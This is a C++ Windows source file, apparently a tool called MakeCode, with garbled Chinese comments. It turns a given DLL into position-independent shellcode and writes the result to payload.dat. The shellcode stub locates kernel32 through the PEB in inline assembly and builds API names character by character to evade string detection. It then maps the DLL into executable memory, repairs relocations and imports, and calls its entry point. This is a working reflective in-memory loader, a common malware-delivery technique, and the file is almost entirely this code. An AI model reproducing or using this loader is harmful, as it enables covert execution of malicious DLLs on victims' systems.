// GotoCode.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include <windows.h>
#include <winnt.h>

#define OUT_FILE _T("payload.dat")
#define FIND_FLAG 0xAFBFAFBF

#define  GetAlignedSize(nOrigin, nAlignment)  ((nOrigin) + (nAlignment) - 1) / (nAlignment) * (nAlignment)

typedef BOOL	(APIENTRY *ProcDllMain)		( HINSTANCE, DWORD, LPVOID);
typedef FARPROC (WINAPI *MyGetProcAddress)	( HMODULE hModule, LPCSTR lpProcName);
typedef LPVOID  (WINAPI *MyVirtualAlloc)	( LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);
typedef BOOL    (WINAPI *MyVirtualProtect)	( LPVOID lpAddress,SIZE_T dwSize,DWORD flNewProtect,PDWORD lpflOldProtect);
typedef HMODULE (WINAPI *MyGetModuleHandleA)( LPCSTR lpModuleName );
typedef HMODULE (WINAPI *MyLoadLibraryA)	( LPCSTR lpLibFileName );
typedef BOOL    (WINAPI *MyVirtualFree)		( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType );


#ifndef _DEBUG
void WINAPI payLoad()
#else
void WINAPI payLoad(LPVOID lpFileData,DWORD nDataLength)
#endif
{
#ifndef _DEBUG
	DWORD nDataLength;

	_asm
	{
		push 0xAFAFAFAF
		pop nDataLength
	}

	LPBYTE lpFileData;

	//�Զ�λ
	_asm
	{
		call SELF
SELF:
		pop lpFileData
	}

	for (int i = 0 ; i < 10000 ; i++)
	{
		if (lpFileData[i] == 0xBF && lpFileData[i+1] == 0xAF && lpFileData[i + 2] == 0xBF && lpFileData[i+3 ] == 0xAF)
		{
			lpFileData += i;
			lpFileData += 4;
			break;
		}
	}

#endif


	HMODULE hMod;
	MyGetProcAddress	myGetProcAddress;
	MyLoadLibraryA		myLoadLibrayA;

	MyVirtualAlloc		myVirtualAlloc;
	MyVirtualFree		myVirtualFree;
	MyVirtualProtect	myVirtualProtect;
	MyGetModuleHandleA	myGetModuleHandleA;

	//�õ�Kernel32�����GetProcAddress��ַ
	__asm{

		pushad    //����Ĵ���

		mov eax, dword ptr fs:[0x30];  
		mov eax, dword ptr [eax+0xC];  
		mov eax, dword ptr [eax+0xC];  
		mov eax, dword ptr [eax];  
		mov eax, dword ptr [eax];  
		mov eax, dword ptr [eax+0x18];  

		mov hMod,eax
		mov myGetProcAddress,eax

		push ebp

		mov ebp,eax                         // Kernel.dll��ַ  
		mov eax,dword ptr ss:[ebp+3CH]      // eax=PE�ײ�  
		mov edx,dword ptr ds:[eax+ebp+78H]  //  
		add edx,ebp                         // edx=�������ַ  
		mov ecx,dword ptr ds:[edx+18H]      // ecx=��������������NumberOfFunctions  
		mov ebx,dword ptr ds:[edx+20H]      //  
		add ebx,ebp                         // ebx=��������ַ��AddressOfName  
start:                                      //  
		dec ecx                             // ѭ���Ŀ�ʼ  
		mov esi,dword ptr ds:[ebx+ecx*4]    //  
		add esi,ebp                         //  
		mov eax,0x50746547                  //  
		cmp dword ptr ds:[esi],eax          // �Ƚ�PteG  
		jnz start                           //  
		mov eax,0x41636F72                  //  
		cmp dword ptr ds:[esi+4],eax        // �Ƚ�Acor��ͨ��GetProcA�����ַ�����ȷ����GetProcAddress  
		jnz start                           //  
		mov ebx,dword ptr ds:[edx+24H]      //  
		add ebx,ebp                         //  
		mov cx,word ptr ds:[ebx+ecx*2]      //  
		mov ebx,dword ptr ds:[edx+1CH]      //  
		add ebx,ebp                         //  
		mov eax,dword ptr ds:[ebx+ecx*4]    //  
		add eax,ebp                         // eax ������GetProcAddress��ַ  
		mov ebx,eax                         // GetProcAddress��ַ����ebx�����дShellCode�Ļ��Ժ󻹿���

		pop ebp

		push ebx
		pop myGetProcAddress

		popad
	}


	char szImport[255];

	szImport[0] = 'L';
	szImport[1] = 'o';
	szImport[2] = 'a';
	szImport[3] = 'd';
	szImport[4] = 'L';
	szImport[5] = 'i';
	szImport[6] = 'b';
	szImport[7] = 'r';
	szImport[8] = 'a';
	szImport[9] = 'r';
	szImport[10] = 'y';
	szImport[11] = 'A';
	szImport[12] = 0x00;

	myLoadLibrayA = (MyLoadLibraryA)myGetProcAddress(hMod,szImport);

	szImport[0] = 'V';
	szImport[1] = 'i';
	szImport[2] = 'r';
	szImport[3] = 't';
	szImport[4] = 'u';
	szImport[5] = 'a';
	szImport[6] = 'l';
	szImport[7] = 'A';
	szImport[8] = 'l';
	szImport[9] = 'l';
	szImport[10] = 'o';
	szImport[11] = 'c';
	szImport[12] = 0x00;

	myVirtualAlloc = (MyVirtualAlloc)myGetProcAddress(hMod,szImport);

	szImport[0] = 'V';
	szImport[1] = 'i';
	szImport[2] = 'r';
	szImport[3] = 't';
	szImport[4] = 'u';
	szImport[5] = 'a';
	szImport[6] = 'l';
	szImport[7] = 'F';
	szImport[8] = 'r';
	szImport[9] = 'e';
	szImport[10] = 'e';
	szImport[11] = 0x00;

	myVirtualFree = (MyVirtualFree)myGetProcAddress(hMod,szImport);

	szImport[0] = 'V';
	szImport[1] = 'i';
	szImport[2] = 'r';
	szImport[3] = 't';
	szImport[4] = 'u';
	szImport[5] = 'a';
	szImport[6] = 'l';
	szImport[7] = 'P';
	szImport[8] = 'r';
	szImport[9] = 'o';
	szImport[10] = 't';
	szImport[11] = 'e';
	szImport[12] = 'c';
	szImport[13] = 't';
	szImport[14] = 0x00;

	myVirtualProtect = (MyVirtualProtect)myGetProcAddress(hMod,szImport);

	szImport[0] = 'V';
	szImport[1] = 'i';
	szImport[2] = 'r';
	szImport[3] = 't';
	szImport[4] = 'u';
	szImport[5] = 'a';
	szImport[6] = 'l';
	szImport[7] = 'A';
	szImport[8] = 'l';
	szImport[9] = 'l';
	szImport[10] = 'o';
	szImport[11] = 'c';
	szImport[12] = 0x00;

	myVirtualAlloc = (MyVirtualAlloc)myGetProcAddress(hMod,szImport);

	szImport[0] = 'G';
	szImport[1] = 'e';
	szImport[2] = 't';
	szImport[3] = 'M';
	szImport[4] = 'o';
	szImport[5] = 'd';
	szImport[6] = 'u';
	szImport[7] = 'l';
	szImport[8] = 'e';
	szImport[9] = 'H';
	szImport[10] = 'a';
	szImport[11] = 'n';
	szImport[12] = 'd';
	szImport[13] = 'l';
	szImport[14] = 'e';
	szImport[15] = 'A';
	szImport[16] = 0x00;

	myGetModuleHandleA = (MyGetModuleHandleA)myGetProcAddress(hMod,szImport);

	PIMAGE_DOS_HEADER		pDosHeader;
	PIMAGE_NT_HEADERS		pNTHeader;
	PIMAGE_SECTION_HEADER	pSectionHeader;


	/************************************************************************/
	/*                        ���������Ч�ԣ�����ʼ��                      */
	/************************************************************************/

	//��鳤��
	if (nDataLength < sizeof(IMAGE_DOS_HEADER))
	{
		return;
	}
	pDosHeader = (PIMAGE_DOS_HEADER)lpFileData;  // DOSͷ
	//���dosͷ�ı��
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return;  //0x5A4D : MZ
	}

	//��鳤��
	if ((DWORD)nDataLength < (pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)))
	{
		return;
	}
	//ȡ��peͷ
	pNTHeader = (PIMAGE_NT_HEADERS)((PBYTE)lpFileData + pDosHeader->e_lfanew); // PEͷ
	//���peͷ�ĺϷ���
	if (pNTHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		return;  //0x00004550 : PE00
	}
	if ((pNTHeader->FileHeader.Characteristics & IMAGE_FILE_DLL) == 0) //0x2000  : File is a DLL
	{
		return;  
	}
	if ((pNTHeader->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) == 0) //0x0002 : ָ���ļ���������
	{
		return;
	}
	if (pNTHeader->FileHeader.SizeOfOptionalHeader != sizeof(IMAGE_OPTIONAL_HEADER))
	{
		return;
	}	

	//ȡ�ýڱ��α�
	pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)pNTHeader + sizeof(IMAGE_NT_HEADERS));
	//��֤ÿ���ڱ�Ŀռ�
	for (int i=0; i< pNTHeader->FileHeader.NumberOfSections; i++)
	{
		if ((pSectionHeader[i].PointerToRawData + pSectionHeader[i].SizeOfRawData) > (DWORD)nDataLength)
		{
			return;
		}
	}

	/************************************************************************/
	/*                                  OVER                                */
	/************************************************************************/

	/************************************************************************/
	/*                          ��������ļ��ؿռ�                          */
	/************************************************************************/
	int nImageSize = 0;

	if (pNTHeader == NULL)
	{
		return;
	}

	int nAlign = pNTHeader->OptionalHeader.SectionAlignment; //�ζ����ֽ���

	// ��������ͷ�ĳߴ硣����dos, coff, peͷ �� �α�Ĵ�С
	nImageSize = GetAlignedSize(pNTHeader->OptionalHeader.SizeOfHeaders, nAlign);
	// �������нڵĴ�С
	for (int i=0; i < pNTHeader->FileHeader.NumberOfSections; ++i)
	{
		//�õ��ýڵĴ�С
		int nCodeSize = pSectionHeader[i].Misc.VirtualSize ;
		int nLoadSize = pSectionHeader[i].SizeOfRawData;
		int nMaxSize = (nLoadSize > nCodeSize) ? (nLoadSize) : (nCodeSize);
		int nSectionSize = GetAlignedSize(pSectionHeader[i].VirtualAddress + nMaxSize, nAlign);

		if (nImageSize < nSectionSize)
		{
			nImageSize = nSectionSize;  //Use the Max;
		}
	}

	/************************************************************************/
	/*                            OVER                                      */
	/************************************************************************/

	if (nImageSize == 0)
	{
		return;
	}
	// ���������ڴ�
	void *pMemoryAddress = myVirtualAlloc(NULL, nImageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (pMemoryAddress == NULL)
	{
		return;
	}
	else
	{
		/************************************************************************/
		/*                       ����dll���ݣ�������ÿ����                      */
		/************************************************************************/

		LPVOID pDest = pMemoryAddress;
		LPVOID pSrc = lpFileData;

		// ������Ҫ���Ƶ�PEͷ+�α��ֽ���
		int  nHeaderSize = pNTHeader->OptionalHeader.SizeOfHeaders;
		int  nSectionSize = pNTHeader->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
		int  nMoveSize = nHeaderSize + nSectionSize;
		//����ͷ�Ͷ���Ϣ
		//memcpy(pDest, pSrc, nMoveSize);

		for (int i = 0; i < nMoveSize ; i++)
		{
			((char*)pDest)[i] = ((char*)pSrc)[i];
		}

		//����ÿ����
		for (int i=0; i < pNTHeader->FileHeader.NumberOfSections; ++i)
		{
			if (pSectionHeader[i].VirtualAddress == 0 || pSectionHeader[i].SizeOfRawData == 0)
			{
				continue;
			}
			// ��λ�ý����ڴ��е�λ��
			void *pSectionAddress = (void *)((PBYTE)pDest + pSectionHeader[i].VirtualAddress);
			
			
			// ���ƶ����ݵ������ڴ�
// 			memcpy((void *)pSectionAddress, (void *)((PBYTE)pSrc + pSectionHeader[i].PointerToRawData),
// 				pSectionHeader[i].SizeOfRawData);

			for (int j = 0; j < pSectionHeader[i].SizeOfRawData ; j++)
			{
				((char*)pSectionAddress)[j] = ((char*)((PBYTE)pSrc + pSectionHeader[i].PointerToRawData))[j];
			}
		}

		//����ָ�룬ָ���·�����ڴ�
		//�µ�dosͷ
		pDosHeader = (PIMAGE_DOS_HEADER)pDest;
		//�µ�peͷ��ַ
		pNTHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDest + (pDosHeader->e_lfanew));
		//�µĽڱ��ַ
		pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)pNTHeader + sizeof(IMAGE_NT_HEADERS));

		/************************************************************************/
		/*                                   OVER                               */
		/************************************************************************/

		//�ض�λ��Ϣ
		if (pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress > 0
			&& pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0)
		{
			/************************************************************************/
			/*                          �޸��ض�λ��Ϣ                              */
			/************************************************************************/

			void *pNewBase  = pMemoryAddress;

			/* �ض�λ��Ľṹ��
			// DWORD sectionAddress, DWORD size (����������Ҫ�ض�λ������)
			// ���� 1000����Ҫ����5���ض�λ���ݵĻ����ض�λ���������
			// 00 10 00 00   14 00 00 00      xxxx xxxx xxxx xxxx xxxx 0000
			// -----------   -----------      ----
			// �����ڵ�ƫ��  �ܳߴ�=8+6*2     ��Ҫ�����ĵ�ַ           ���ڶ���4�ֽ�
			// �ض�λ�������ɸ����������address �� size����0 ��ʾ����
			// ��Ҫ�����ĵ�ַ��12λ�ģ���4λ����̬�֣�intel cpu����3
			*/
			//����NewBase��0x600000,���ļ������õ�ȱʡImageBase��0x400000,������ƫ��������0x200000
	
			//ע���ض�λ���λ�ÿ��ܺ�Ӳ���ļ��е�ƫ�Ƶ�ַ��ͬ��Ӧ��ʹ�ü��غ�ĵ�ַ
			PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)((unsigned long)pNewBase 
				+ pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

			while ((pLoc->VirtualAddress + pLoc->SizeOfBlock) != 0) //��ʼɨ���ض�λ��
			{
				WORD *pLocData = (WORD *)((PBYTE)pLoc + sizeof(IMAGE_BASE_RELOCATION));
				//���㱾����Ҫ�������ض�λ���ַ������Ŀ
				int nNumberOfReloc = (pLoc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);

				for ( int i=0 ; i < nNumberOfReloc; i++)
				{
					// ÿ��WORD����������ɡ���4λָ�����ض�λ�����ͣ�WINNT.H�е�һϵ��IMAGE_REL_BASED_xxx�������ض�λ���͵�ȡֵ��
					// ��12λ�������VirtualAddress���ƫ�ƣ�ָ���˱�������ض�λ��λ�á�
					if ((DWORD)(pLocData[i] & 0x0000F000) == 0x0000A000)
					{
						// 64λdll�ض�λ��IMAGE_REL_BASED_DIR64
						// ����IA-64�Ŀ�ִ���ļ����ض�λ�ƺ�����IMAGE_REL_BASED_DIR64���͵ġ�
		#ifdef _WIN64
						ULONGLONG* pAddress = (ULONGLONG *)((PBYTE)pNewBase + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
						ULONGLONG ullDelta = (ULONGLONG)pNewBase - pNTHeader->OptionalHeader.ImageBase;
						*pAddress += ullDelta;
		#endif
					}
					else if ((DWORD)(pLocData[i] & 0x0000F000) == 0x00003000) //����һ����Ҫ�����ĵ�ַ
					{
						// 32λdll�ض�λ��IMAGE_REL_BASED_HIGHLOW
						// ����x86�Ŀ�ִ���ļ������еĻ�ַ�ض�λ����IMAGE_REL_BASED_HIGHLOW���͵ġ�
		#ifndef _WIN64
						DWORD* pAddress = (DWORD *)((PBYTE)pNewBase + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
						DWORD dwDelta = (DWORD)pNewBase - pNTHeader->OptionalHeader.ImageBase;
						*pAddress += dwDelta;
		#endif
					}
				}
				//ת�Ƶ���һ���ڽ��д���
				pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc->SizeOfBlock);
			}

			/************************************************************************/
			/*                          OVER                                        */
			/************************************************************************/
		}

		/************************************************************************/
		/*                             ��������ַ��                           */
		/************************************************************************/
			
		void* pImageBase = pMemoryAddress;
		BOOL ret = FALSE;


		// �����ʵ������һ�� IMAGE_IMPORT_DESCRIPTOR �ṹ���飬ȫ����0��ʾ����
		// ���鶨�����£�
		// 
		// DWORD   OriginalFirstThunk;         // 0��ʾ����������ָ��δ�󶨵�IAT�ṹ����
		// DWORD   TimeDateStamp; 
		// DWORD   ForwarderChain;             // -1 if no forwarders
		// DWORD   Name;                       // ����dll������
		// DWORD   FirstThunk;                 // ָ��IAT�ṹ����ĵ�ַ(�󶨺���ЩIAT�������ʵ�ʵĺ�����ַ)
		unsigned long nOffset = pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress ;

		if (nOffset == 0)
		{
			ret = TRUE; //No Import Table
		}

		PIMAGE_IMPORT_DESCRIPTOR pID = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pImageBase + nOffset);

		while (pID->Characteristics != 0)
		{
			PIMAGE_THUNK_DATA pRealIAT = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pID->FirstThunk);
			PIMAGE_THUNK_DATA pOriginalIAT = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pID->OriginalFirstThunk);
			//��ȡdll������
#define NAME_BUF_SIZE 256

			char szBuf[NAME_BUF_SIZE]; //dll name;
			BYTE* pName = (BYTE*)((PBYTE)pImageBase + pID->Name);
			int i=0;

			for (i=0; i<NAME_BUF_SIZE; i++)
			{
				if (pName[i] == 0)
				{
					break;
				}
				szBuf[i] = pName[i];
			}
			if (i >= NAME_BUF_SIZE)
			{
				ret = FALSE;  // bad dll name
			}
			else
			{
				szBuf[i] = 0;
			}

			HMODULE hDll = myGetModuleHandleA(szBuf);

			if (hDll == NULL)
			{
				hDll = myLoadLibrayA(szBuf);
				if (hDll == NULL) ret = FALSE;
				//return FALSE; //NOT FOUND DLL
			}
			//��ȡDLL��ÿ�����������ĵ�ַ������IAT
			//ÿ��IAT�ṹ�� ��
			// union { PBYTE  ForwarderString;
			//   PDWORD Function;
			//   DWORD Ordinal;
			//   PIMAGE_IMPORT_BY_NAME  AddressOfData;
			// } u1;
			// ������һ��DWORD ����������һ����ַ��
			for (i=0; ; i++)
			{
				if (pOriginalIAT[i].u1.Function == 0)
				{
					break;
				}

				FARPROC lpFunction = NULL;

				if (pOriginalIAT[i].u1.Ordinal & IMAGE_ORDINAL_FLAG) //�����ֵ�������ǵ������
				{
					lpFunction = myGetProcAddress(hDll, (LPCSTR)(pOriginalIAT[i].u1.Ordinal & 0x0000FFFF));
				}
				else //�������ֵ���
				{
					//��ȡ��IAT���������ĺ�������
					PIMAGE_IMPORT_BY_NAME pByName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pImageBase + (pOriginalIAT[i].u1.AddressOfData));

					lpFunction = myGetProcAddress(hDll, (char *)pByName->Name);
				}
				if (lpFunction != NULL)   //�ҵ��ˣ�
				{
#ifdef _WIN64
					pRealIAT[i].u1.Function = (ULONGLONG)lpFunction;
#else
					pRealIAT[i].u1.Function = (DWORD)lpFunction;
#endif
				}
				else
				{
					ret = FALSE;
				}
			}

			//move to next 
			pID = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pID + sizeof(IMAGE_IMPORT_DESCRIPTOR));
		}

		ret = TRUE;

		/************************************************************************/
		/*                             OVER                                     */
		/************************************************************************/

		if (!ret) //���������ַ��ʧ��
		{
			myVirtualFree(pMemoryAddress, 0, MEM_RELEASE);
			return;
		}
		//�޸�ҳ���ԡ�Ӧ�ø���ÿ��ҳ�����Ե����������Ӧ�ڴ�ҳ�����ԡ������һ�¡�
		//ͳһ���ó�һ������PAGE_EXECUTE_READWRITE
		unsigned long unOld;

		myVirtualProtect(pMemoryAddress, nImageSize, PAGE_EXECUTE_READWRITE, &unOld);
	}
	//��������ַ
#ifdef WIN32
	pNTHeader->OptionalHeader.ImageBase = (DWORD)pMemoryAddress;
#else
	pNTHeader->OptionalHeader.ImageBase = (ULONGULONG)pMemoryAddress;
#endif
	//������Ҫ����һ��dll����ں���������ʼ��������
	ProcDllMain pDllMain = (ProcDllMain)(pNTHeader->OptionalHeader.AddressOfEntryPoint + (PBYTE)pMemoryAddress);

	BOOL InitResult = pDllMain((HINSTANCE)pMemoryAddress, DLL_PROCESS_ATTACH, 0);

	if (!InitResult) //��ʼ��ʧ��
	{
		pDllMain((HINSTANCE)pMemoryAddress, DLL_PROCESS_DETACH, 0);
		myVirtualFree(pMemoryAddress, 0, MEM_RELEASE);
		pDllMain = NULL;
		return;
	}
	return;
}

BOOL MakeCode(LPBYTE payload,DWORD size1, LPBYTE context,DWORD size2)
{
	HANDLE hFile = CreateFile(OUT_FILE,GENERIC_ALL,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwOutSize = 0;
		DWORD flag = FIND_FLAG;

		WriteFile(hFile,payload,size1,&dwOutSize,0);
		SetFilePointer(hFile,0,0,FILE_END);
		WriteFile(hFile,&flag,4,&dwOutSize,0);
		SetFilePointer(hFile,0,0,FILE_END);
		WriteFile(hFile,context,size2,&dwOutSize,0);

		CloseHandle(hFile);
	}

	return hFile != INVALID_HANDLE_VALUE;
}

typedef void (WINAPI *fnPaylaod)();

void TestPayload()
{
	HANDLE hFile = CreateFile(OUT_FILE,GENERIC_ALL,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwSize = GetFileSize(hFile,0);
		LPVOID buf = VirtualAlloc(NULL, dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		DWORD dwOutSize = 0;
		ReadFile(hFile,buf,dwSize,&dwOutSize,0);

		DWORD dwFlag = 0;
		VirtualProtect(buf,dwSize,PAGE_EXECUTE_READWRITE,&dwFlag);

		((fnPaylaod)buf)();

		VirtualFree(buf,0,MEM_RELEASE);
		CloseHandle(hFile);
	}
}

void Usage()
{
	printf("\nUsage : MakeCode.exe [filename]\n");
	printf("Make by floyd\n");
}

int _tmain(int argc, _TCHAR* argv[])
{
	if (argc  < 2)
	{
		Usage();
		return 0;
	}

	printf("\n");

	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL,szPath,MAX_PATH);

	for(int i = lstrlen(szPath) -1; i > 0 ;i-- )
	{
		if (szPath[i] == _T('\\'))
		{
			szPath[i+1] = _T('\0');
			break;
		}
	}

	lstrcat(szPath,argv[1]);

	HANDLE hFile = CreateFile(szPath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,NULL,0);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("OPEN FILE UNSUCCESSFULE! %d\n",GetLastError());
		return 0;
	}

	DWORD dwSize = GetFileSize(hFile,0);

	printf("FILE SIZE = %d \n",dwSize);

	LPBYTE lpContext = (LPBYTE)malloc(dwSize);

	DWORD dwReaded = 0;

	ReadFile(hFile,lpContext,dwSize,&dwReaded,0);

#ifndef _DEBUG

	DWORD SCSize = (DWORD)((DWORD)MakeCode - (DWORD)payLoad);

	printf("PAYLOAD SIZE = %d \n",SCSize);

	char *payload = (char*)malloc(SCSize);
	memcpy(payload,payLoad,SCSize);

	int flag = 0xAFAFAFAF;

	for (UINT i = 0 ;i < SCSize ; i++)
	{
		if (memcmp(payload + i ,&flag,4) == 0)
		{
			*(int*)(payload + i) = dwSize;
			break;
		}
	}

	if ( MakeCode((LPBYTE)payload,SCSize,lpContext,dwSize))
	{
		printf("SUCCESSFULLY!\n");
	}
	else
	{
		printf("MAKE SHELLCODE FAILD!\n");
	}



	if (payload)
	{
		free(payload);
	}
#else
	payLoad(lpContext,dwSize);
#endif

	if (lpContext)
	{
		free(lpContext);
	}

	if (hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
	}

	return 0;
}

